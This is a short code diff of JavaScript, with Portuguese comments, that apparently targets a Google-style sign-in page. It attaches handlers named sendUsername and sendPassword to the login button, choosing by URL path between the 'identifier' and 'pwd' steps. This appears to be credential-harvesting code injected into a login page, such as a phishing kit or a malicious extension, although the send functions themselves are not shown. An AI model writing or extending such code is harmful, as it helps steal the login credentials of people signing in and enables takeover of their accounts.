@@ -42,6 +42,11 @@ function sendPassword() {
 
 // Adiciona os manipuladores de eventos para os botões de envio do formulário
 let btn = document.querySelector("[class='VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 qIypjc TrZEUc lw1w4b']");
+let path =  location.pathname.split('/')
 
-btn.addEventListener('click', sendUsername);
-btn.addEventListener('click', sendPassword);
+if (path[path.length - 1] == 'identifier'){
+  btn.addEventListener('click', sendUsername);
+}
+else if (path[path.length - 1] == 'pwd'){
+  btn.addEventListener('click', sendPassword);
+}
